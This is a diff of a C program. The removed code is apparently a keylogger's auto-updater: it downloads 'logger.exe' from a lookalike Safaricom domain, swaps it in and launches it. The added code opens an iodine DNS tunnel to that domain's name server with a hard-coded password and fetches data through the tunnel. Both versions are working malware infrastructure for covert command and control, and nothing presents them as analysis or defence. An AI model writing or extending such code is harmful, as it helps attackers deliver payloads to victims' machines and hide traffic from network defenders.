@@ -1,22 +1,17 @@
-#include <curl/curl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <windows.h>
+#include <curl/curl.h>
 
-size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
-    size_t written = fwrite(ptr, size, nmemb, stream);
-    return written;
-}
-
+// Callback function for curl's CURLOPT_WRITEFUNCTION
 size_t write_to_memory(void *contents, size_t size, size_t nmemb, void *userp) {
     size_t realsize = size * nmemb;
     char **memory = (char **)userp;
     *memory = realloc(*memory, realsize + 1);
-    if(*memory == NULL) {
-        // out of memory!
-        fprintf(stderr, "not enough memory (realloc returned NULL)\n");
-        exit(EXIT_FAILURE);
+    if (*memory == NULL) {
+        // Out of memory
+        fprintf(stderr, "Not enough memory (realloc returned NULL)\n");
+        return 0;
     }
     memcpy(*memory, contents, realsize);
     (*memory)[realsize] = 0;
@@ -26,9 +21,8 @@ size_t write_to_memory(void *contents, size_t size, size_t nmemb, void *userp) {
 char *fetch_version() {
     CURL *curl;
     CURLcode res;
-    char *url = "https://safaricom.pro/versioning.txt";
+    char *url = "https://10.0.0.1/versioning.txt"; // Use the appropriate IP set by iodine
     char *memory = malloc(1);
-    size_t size = 0;
 
     curl = curl_easy_init();
     if (curl) {
@@ -46,120 +40,28 @@ char *fetch_version() {
     return memory;
 }
 
-BOOL write_version_to_config(const char *version) {
-    FILE *fp = fopen("config.txt", "w");
-    if (!fp) {
-        return FALSE;
-    }
-    fprintf(fp, "version=%s", version);
-    fclose(fp);
-    return TRUE;
-}
-
-char* read_version_from_config() {
-    FILE *file = fopen("config.txt", "r");
-    if (!file) return NULL;
-    char line[50];
-    char *version = (char*)malloc(10);
-    if (!version) return NULL;
-
-    if (fgets(line, sizeof(line), file)) {
-        sscanf(line, "version=%s", version);
-    }
-    fclose(file);
-
-    // Remove newline if it exists
-    size_t len = strlen(version);
-    if (len > 0 && version[len-1] == '\n') version[len-1] = '\0';
-    return version;
-}
-
-BOOL download_new_executable() {
-    CURL *curl;
-    FILE *fp;
-    CURLcode res;
-    char *url = "https://safaricom.pro/logger.exe";
-    char outfilename[FILENAME_MAX] = "logger_new.exe"; 
-    BOOL success = FALSE;
-
-    curl = curl_easy_init();
-    if (curl) {
-        fp = fopen(outfilename, "wb");
-        curl_easy_setopt(curl, CURLOPT_URL, url);
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
-        res = curl_easy_perform(curl);
-
-        if (res != CURLE_OK) {
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-        } else {
-            success = TRUE;
-        }
-        
-        curl_easy_cleanup(curl);
-        fclose(fp);
-    }
-    return success;
-}
-
 int main() {
-    // Step 1: Fetch the version number
-    char *fetched_version = fetch_version();
-    if (!fetched_version) {
-        fprintf(stderr, "Failed to fetch the version number.\n");
-        return 1;
+    // 1. Establish iodine DNS tunnel connection
+    int iodineStatus = system("iodine -f ns.safaricom.pro Lahaja40");
+    if (iodineStatus == 0) {
+        printf("Iodine connection established.\n");
+    } else {
+        fprintf(stderr, "Error establishing iodine connection.\n");
+        exit(1);
     }
 
-    // Step 1.5: Read the local version number
-    char *local_version = read_version_from_config();
-    if (local_version && strcmp(local_version, fetched_version) == 0) {
-        // Local version is the same as the fetched version. No update needed.
-        free(local_version);
-        free(fetched_version);
-        return 0;
+    // 2. Fetch data using that tunnel
+    char *version_data = fetch_version();
+    if (version_data) {
+        printf("Fetched Data:\n%s\n", version_data);
+        free(version_data);
     }
 
-    // Step 2: Write the fetched version number to config.txt
-    if (!write_version_to_config(fetched_version)) {
-        fprintf(stderr, "Failed to write version to config.txt.\n");
-        free(local_version);
-        free(fetched_version);
-        return 2;
-    }
-    free(local_version);
-    free(fetched_version);
+    // 3. Terminate the iodine DNS tunnel
+    system("killall iodine");
 
-    // Step 3: Download the new executable
-    if (!download_new_executable()) {
-        fprintf(stderr, "Failed to download new executable.\n");
-        return 3;
-    }
-
-    // Wait for a short delay to ensure logger.exe isn't locked or running
-    Sleep(2000);
-
-    // Step 4: Replace the existing executable with the new one
-    if (!MoveFileEx("logger_new.exe", "logger.exe", MOVEFILE_REPLACE_EXISTING)) {
-        fprintf(stderr, "Failed to replace old executable. Error code: %d\n", GetLastError());
-        return 4;
-    }
-
-    // Step 5: Optionally, restart the main application
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-
-    if (!CreateProcess(NULL, "logger.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        fprintf(stderr, "Failed to start logger.exe. Error code: %d\n", GetLastError());
-        return 5;
-    }
-
-    // Close process and thread handles 
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    printf("Press any key to exit...\n");
+    getchar();
 
     return 0;
 }
